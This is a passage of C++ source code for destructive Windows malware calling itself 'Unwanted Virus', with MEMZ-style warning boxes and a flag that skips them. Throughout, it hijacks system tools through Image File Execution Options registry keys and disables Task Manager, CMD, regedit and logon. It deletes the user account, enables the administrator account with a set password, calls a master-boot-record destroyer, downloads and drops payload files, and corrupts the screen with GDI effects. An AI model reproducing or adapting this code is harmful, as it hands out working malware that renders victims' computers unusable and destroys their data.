        GetWindowRect(hwnd, &rekt);
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN);
        Pt[0].x = rekt.left + 1;
        Pt[0].y = rekt.top + 1;
        Pt[1].x = rekt.right + 1;
        Pt[1].y = rekt.top + 1;
        Pt[2].x = rekt.left + 1;
        Pt[2].y = rekt.bottom + 1;
        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);


    }
}


int FuckURScreen() {
    int fur;
    for(fur = 2000; fur >= 0; fur--)
    {
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        Sleep(fur % 10);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY);
        hwnd = GetForegroundWindow();
        hW = GetWindowDC(hwnd);
        hdc = GetDC(0);
        GetWindowRect(hwnd, &rekt);
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN);
        Pt[0].x = rekt.left - 1;
        Pt[0].y = rekt.top + 1;
        Pt[1].x = rekt.right - 1;
        Pt[1].y = rekt.top;
        Pt[2].x = rekt.left - 1;
        Pt[2].y = rekt.bottom + 1;
        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCPAINT);


    }
    return 0;
}


int FuckURScreen2() {


    while (TRUE)
    {
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), BLACKNESS);
        Sleep(500);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), WHITENESS);
        Sleep(500);
    }
}

int SmallScreenEffect() {
    while (1) {
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
        Sleep(100);
    }
}

/* 3:33:33 AM payload */
int SetTimeDate() {
    while (1) {
        ShellExecuteA(NULL, NULL, "cmd", "/c date 06-06-6666 & time 3:33:33", NULL, SW_HIDE);
        Sleep(500);
    }
}


/* registry modifications part */

void DisableTaskmgr() {
    HKEY regHandle;  // disable task manager with registry
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableTaskmgr"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableCMD() {
    HKEY regHandle;  // disable command prompt with registry
    DWORD dwValue = 2;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableCMD"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableLogonUI() {
    // This makes CTRLALTDEL not working and LOGONUI not working...
    HKEY regHandle5; // Disable logonui for preventing starting
    const char* dwValue5 = "accessdenied";
    BYTE* data5 = (BYTE*)&dwValue5;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logonui.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle5, NULL);
    RegSetValueEx(regHandle5, TEXT("Debugger"), 0, REG_SZ, data5, sizeof(DWORD));
    RegCloseKey(regHandle5);
}

void DisableRunDLL32() {
    // RUNDLL32 not working
    HKEY regHandled;
    const char* dwValued = "accessdenied";
    BYTE* datad = (BYTE*)&dwValued;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RunDLL32.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandled, NULL);
    RegSetValueEx(regHandled, TEXT("Debugger"), 0, REG_SZ, datad, sizeof(DWORD));
    RegCloseKey(regHandled);
}

void DisablePowerOptions() {
    HKEY regHandle; // Disable Power Options
    DWORD dwValue = 0;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
        
    HKEY regHandle3; // Disable Logon Ui background
    DWORD dwValue3 = 1;
    BYTE* data3 = (BYTE*)&dwValue3;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle3, NULL);
    RegSetValueEx(regHandle3, TEXT("disablelogonbackgroundimage"), 0, REG_DWORD, data3, sizeof(DWORD));
    RegCloseKey(regHandle3);

    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\u0022 /v Debugger /d \u0022C:\\Windows\\SystemApps\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe\u0022 /v Debugger /d \u0022C:\\Windows\\SystemApps\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe\u0022 /v Debugger /d \u0022C:\\Windows\\SystemApps\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\PowerShell.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Sethc.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul&\u0022", NULL, SW_HIDE);

    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewprocess"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewtab"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewwindow"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\pintohome"));

    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"skiplogonui")) {
            goto skiplogonuidam;
        }
        else {
            // Still there
        }
    }    
    DisableLogonUI();
    skiplogonuidam:

    DisableRunDLL32();
    // This makes Settings app no working
    HKEY regHandle7;
    const char* dwValue7 = "accessdenied";
    BYTE* data7 = (BYTE*)&dwValue7;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle7, NULL);
    RegSetValueEx(regHandle7, TEXT("Debugger"), 0, REG_SZ, data7, sizeof(DWORD));
    RegCloseKey(regHandle7);
    
    // Start Menu not working
    HKEY regHandlea;
    const char* dwValuea = "accessdenied";
    BYTE* dataa = (BYTE*)&dwValuea;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\StartMenuExperienceHost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlea, NULL);
    RegSetValueEx(regHandlea, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandlea);
    ShellExecuteA(NULL, NULL, "cmd", "/c taskkill /f /im startmenuexperiencehost.exe", NULL, SW_HIDE);

    // Svchost not working
    HKEY regHandleb;
    const char* dwValueb = "accessdenied";
    BYTE* datab = (BYTE*)&dwValueb;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Svchost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandleb, NULL);
    RegSetValueEx(regHandleb, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandleb);
    ShellExecuteA(NULL, NULL, "cmd", "/c taskkill /f /im startmenuexperiencehost.exe", NULL, SW_HIDE);

    // Consent not working
    HKEY regHandlee;
    const char* dwValuee = "accessdenied";
    BYTE* datae = (BYTE*)&dwValuee;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Consent.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlee, NULL);
    RegSetValueEx(regHandlee, TEXT("Debugger"), 0, REG_SZ, datae, sizeof(DWORD));
    RegCloseKey(regHandlee);

    // Microsoft Management Console not working
    HKEY regHandlef;
    const char* dwValuef = "accessdenied";
    BYTE* dataf = (BYTE*)&dwValuef;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MMC.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlef, NULL);
    RegSetValueEx(regHandlef, TEXT("Debugger"), 0, REG_SZ, dataf, sizeof(DWORD));
    RegCloseKey(regHandlef);
}

void NoUnwanted1() {
    // This makes unwanted.exe no working
    HKEY regHandle8;
    const char* dwValue8 = "hello?";
    BYTE* data8 = (BYTE*)&dwValue8;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle8, NULL);
    RegSetValueEx(regHandle8, TEXT("Debugger"), 0, REG_SZ, data8, sizeof(DWORD));
    RegCloseKey(regHandle8);
}

void NoUnwanted0() {
    // This makes unwanted.exe working
    RegDeleteKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"));
}

void DisableRegistryTools() {
    HKEY regHandle;
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableRegistryTools"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

/* beep */
DWORD WINAPI StartBeep(LPVOID parameter) {
     Beep(1000, 10000);
     return -1;
}

int RandBeep() {
    while (1) {
        Beep(rand()* 20, 1000);
        Sleep(100);
    }
}

void CreateKillWindows() {

    /* Create KillWindows program for iexplore.exe and userinit payload */
    HANDLE kwi = CreateFileA("C:\\Windows\\SystemApps\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    WriteFile(kwi, kwp, kwp_len, &wb, NULL);

    CloseHandle(kwi);

}

/* removes username and sets other user */
void StartFuckingPC() {

    CreateKillWindows();

    HKEY regHandle2; // Disable Last UserName logon ui
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("dontdisplaylastusername"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);
    
    ShellExecuteA(NULL, NULL, "cmd", "/c net user %username% /delete", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c net user administrator /active:yes", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c net user administrator iwantedthis", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Userinit.exe\u0022 /v Debugger /d \u0022C:\\Windows\\SystemApps\\WINNT32.EXE\u0022", NULL, SW_HIDE);
}

/* here is the code: what happens if you get an error and press OK*/
void DoError() {
     StartFuckingPC();
     DisablePowerOptions();  
     CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
     CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL); 
}

/* Download a file for test Internet connection */
void TestInternetConnection() {
    const wchar_t* srcURLT = L"http://archive.org/download/01101000/0000001.bin";
    const wchar_t* destFileT = L"C:\\Program Files\\Common Files\\system\\damage.bin";
    if (S_OK == URLDownloadToFile(NULL, srcURLT, destFileT, 0, NULL)) {
        // success
        
    }
    else // else kills os
    {
        printf("\n");
        printf("ERROR: No internet connection nor PING reception found\n");
        printf("ERROR: No internet connection nor PING reception found\n");
        printf("ERROR: No internet connection nor PING reception found\n");
        int DisplayResourceNAMessageBox();
        {
            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"Unknown hard error",
                (LPCWSTR)L"unwanted.exe - System Warning",
                MB_ICONWARNING | MB_OK
            );
        };

        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
                goto skipdestroymbr1;
            }
            else
            {
                // Destroy MBR
            }
        }
        DestroyMBR();
        skipdestroymbr1:
        DoError();

        killWindowsInstant();

    };
    
}

int PlayMusik() {
    PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC); // plays music

    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
    return 0;
}


/* Old version of Unwanted (1.0)*/
void PrankFolders() {
    HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    WriteFile(bat, batm, bat_len, &wb, NULL);

    CloseHandle(bat);
    cout << "Archivo Creado\n\n";
    Sleep(100);

    ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_HIDE);
    cout << "Programa Ejecutado\n\n";
    Sleep(1000);
}

/*------------------------------------------------+
| Arguments payload (Used for development)        |
| experimental Old 1.0 Version                    |
| otheruser Other user payload                    |
| disablepoweroptions Registry Payload            |
| killwindowsinstant Kill Windows Instant         |
| startmalwarewithlog Start malware with log      |
| startonlymsgbox Start only message box          |
| idiotmode Idiot payload                         |
| iamalone Secret Payload                         |
| skipdestroymbr Skip Destroy MBR Payload         |
| skiplogonui Skip LogonUI payload                |
| changetext Change Text Payload                  |
+-------------------------------------------------*/

int WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nShowCmd
)
{
    // Arguments command line side 

    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"otheruser")) {
            if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            StartFuckingPC();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"disablepoweroptions")) {
            if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            DisablePowerOptions();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"killwindowsinstant")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            DoError();
            Sleep(1000);
            killWindowsInstant();
        }
        if (!lstrcmpW(argv[1], L"startmalwarewithlog"))
        {
            SetConsoleTitle(TEXT("Unwanted Virus Console Window"));
            ShellExecuteA(NULL, NULL, "cmd", "/c cls", NULL, SW_HIDE);
            cout << "Unwanted Virus Console Versión [2.0.666.0]\n";
            cout << "(c) BenjaminFretez. Todos los derechos reservados.\n\n";
            cout << "This malware is not ready for be used on this mode, are u sure to continue?[y/n]\n";
            cout << "[ Input ] > ";

            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );

                switch (startmsg)
                {
                case IDYES:
                    cout << "Y"; Sleep(100); cout << "e"; Sleep(100); cout << "s"; Sleep(100); cout << "  "; Sleep(100); cout << "=";  Sleep(100); cout << ")"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    goto malware; // run malware
                case IDNO:
                    cout << "N"; Sleep(100); cout << "o"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    int startmsg = MessageBox(
                        NULL,
                        (LPCWSTR)L"OK, you missed the fun...",
                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                        MB_ICONINFORMATION | MB_OK
                    );
                    break;
                }
                return startmsg;
            }

        }
        if (!lstrcmpW(argv[1], L"startonlymsgbox")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            while(1){}
        }
        if (!lstrcmpW(argv[1], L"changetext")) {
            if (MessageBoxA(hwnd,
                "This payload is considered semi-harmful.\r\nThis means, it should be safe to use, but can still cause data loss or other things you might not want.\r\n\r\n\
If you have productive data on your system or signed in to online accounts, it is recommended to run this payload inside a \
virtual machine in order to prevent potential data loss or changed things you might not want.\r\n\r\n\
Do you still want to enable it?",
"MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
            while(1){}
        }
        if (!lstrcmpW(argv[1], L"randbeep")) {
            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
            while (1) {}
        }
        if (!lstrcmpW(argv[1], L"/about")) {
            cout << "Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0";
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0", // about msgbox
                (LPCWSTR)L"About Unwanted Virus",
                NULL | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/nowarning")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto malware; // Skips the Warning
        }
        if (!lstrcmpW(argv[1], L"/help")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/?")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }
        
        if (!lstrcmpW(argv[1], L"/why")) {
            ShellExecuteA(NULL, NULL, "http://youtu.be/QbjYksxk4gA", NULL, NULL, SW_SHOWDEFAULT);
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/hell")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"H E L L", // hell message box
                (LPCWSTR)L"H E L L",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"skipdestroymbr")) { // skip destroy mbr
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"skiplogonui")){
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"experimental")) {
            HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

            WriteFile(bat, batm, bat_len, &wb, NULL);

            CloseHandle(bat);
            cout << "Archivo Creado\n\n";
            Sleep(100);

            ShellExecuteA(NULL, NULL, "cmd", "/c \u0022C:\\Program Files\\Common Files\\system\\Program.bat\u0022", NULL, SW_HIDE);
            cout << "Programa Ejecutado\n\n";
            Sleep(1000);
            ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_SHOWDEFAULT);
            cout << "Notepad abierto\n\n";
            Sleep(1000);


            return 0;
        }
    }

    else {        
        // Start of the history
        // Here is the warning seen on the first place
        ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
        warning:
        NoUnwanted1();
        int DisplayResourceNameMessageBox();
        {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONWARNING | MB_YESNO 
            );

            switch (startmsg)
            {
            case IDYES:                
                goto malware; // run malware
            case IDNO:
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"OK, you missed the fun...",
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONERROR | MB_OK
                );
                NoUnwanted0();
                break;
            }
            return startmsg;
        }




    malware:       
        NoUnwanted1();
        CreateThread(NULL, NULL, &payloadThread, &SetTimeDate, NULL, NULL);
        TestInternetConnection();
        PlaySound(TEXT("C:\\Windows\\Media\\Windows Recycle.wav"), NULL, SND_ASYNC);
        StartFuckingPC(); // Deletes the user then activates other user

        ShellExecuteA(NULL, NULL, "cmd", "/c reg add \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe\u0022 /v GlobalFlag /t REG_DWORD /d 512", NULL, SW_HIDE);
        ShellExecuteA(NULL, NULL, "cmd", "/c reg add \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\unwanted.exe\u0022 /v ReportingMode /t REG_DWORD /d 1", NULL, SW_HIDE);
        ShellExecuteA(NULL, NULL, "cmd", "/c reg add \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\unwanted.exe\u0022 /v MonitorProcess /d \u0022C:\\Windows\\SystemApps\\WINNT32.EXE\u0022", NULL, SW_HIDE);
        

        // Destroy the MBR =)
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
                goto SkipDestroyMbr;
                // Do not destroy MBR and continue
            }
            else
            {
                // Still there
            }
        }
        DestroyMBR();
        // Destroys MBR and continue
        SkipDestroyMbr:

        DisablePowerOptions(); // Disable Power Options on LogonUI
        CreateThread(NULL, NULL, &payloadThread, &HideC, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &HidePrograms, NULL, NULL);
        ShellExecuteA(NULL, NULL, "cmd", "/c Taskkill /f /im ProcessHacker.exe", NULL, SW_HIDE); // Kills Process Hacker in case if it is open
        ShellExecuteA(NULL, NULL, "cmd", "/c Taskkill /f /im taskmgr.exe", NULL, SW_HIDE); // Kills Task Manager for disable it
        DisableTaskmgr();
        ShellExecuteA(NULL, NULL, "cmd", "/c Taskkill /f /im regedit.exe", NULL, SW_HIDE); // Kills Regedit in case if it is open
        ShellExecuteA(NULL, NULL, "cmd", "/c Taskkill /f /im cmd.exe", NULL, SW_HIDE); // Kills Command Prompt for disable it

        ShellExecuteA(NULL, NULL, "cmd", "/c REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\TaskKill.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title TASKKILL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul&\u0022", NULL, SW_HIDE);
        Sleep(200); // Waits 200 Miliseconds  
     
        DisableCMD(); // Disable Command Prompt
        DisableRegistryTools(); // Disable Regedit


        

        const wchar_t* srcURL = L"http://archive.org/download/01101000/0000003.bin"; // Music Download
        const wchar_t* destFile = L"C:\\Program Files\\Common Files\\system\\Panic.wav";
        if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
        {
            // success

        }
        // else kills os
        else
        {

            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            DestroyMBR();
            DoError();
            killWindowsInstant();

            return -1;
        };

        // Create Die Text

        HANDLE die = CreateFileA("C:\\Program Files\\Common Files\\system\\Die.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        WriteFile(die, diem, die_len, &wb, NULL);

        CloseHandle(die);

        // Create the Last Text

        HANDLE last = CreateFileA("C:\\Program Files\\Common Files\\system\\Last.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

